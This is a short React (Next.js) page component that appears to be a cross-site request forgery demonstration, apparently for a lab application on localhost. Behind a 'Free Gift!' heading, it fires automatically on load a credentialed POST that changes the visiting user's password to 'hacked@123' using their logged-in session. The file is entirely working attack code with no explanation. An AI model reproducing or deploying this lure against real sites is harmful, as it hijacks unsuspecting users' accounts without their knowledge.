"use client"
import { useEffect } from "react";

export default function Evilpage() {
    useEffect(() => {
      hackeuser()
    }, []);

    const hackeuser = async () => {
        let res = await fetch("http://localhost:3000/api/lab-user/updatepassword",{
        method : "POST",
        headers : {
            "Content-Type" : "application/json"
        },
        body : JSON.stringify({currentpassword : "whatever",newpassword : "hacked@123"}),
        credentials : "include"
      })
      let data = await res.json()
      console.log(data)
    }

    return <h1>Free Gift! 🎁</h1>;
}